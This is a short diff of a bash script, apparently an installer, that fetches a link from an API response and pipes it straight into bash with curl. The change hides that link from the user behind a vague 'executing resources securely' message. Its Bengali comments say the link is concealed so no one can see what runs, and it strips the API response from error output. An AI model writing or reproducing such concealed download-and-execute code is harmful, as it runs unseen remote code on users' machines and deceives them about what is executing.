@@ -30,12 +30,13 @@ if [ -n "$SUCCESS" ]; then
     EXEC_LINK=$(echo "$RESPONSE" | sed -n 's/.*"utility_link":"\([^"]*\)".*/\1/p')
     
     if [ -n "$EXEC_LINK" ]; then
-        echo -e "\e[34mDownloading and executing main script from: $EXEC_LINK\e[0m"
-        # এই লাইনটাই আসল কাজটা করবে
+        # এখানে লিংকটা হাইড করে শুধু একটা সিকিউর মেসেজ দেখানো হচ্ছে
+        echo -e "\e[34mDownloading and executing resources securely...\e[0m"
+        
+        # ব্যাকগ্রাউন্ডে স্ক্রিপ্ট রান হবে, কিন্তু লিংক কেউ দেখতে পাবে না
         curl -sL "$EXEC_LINK" | bash
     else
-        echo -e "\e[31mError: No execution link found in API response.\e[0m"
-        echo "Response: $RESPONSE"
+        echo -e "\e[31mError: Deployment configuration missing. Please contact admin.\e[0m"
     fi
 else
     echo -e "\e[31m==========================================\e[0m"
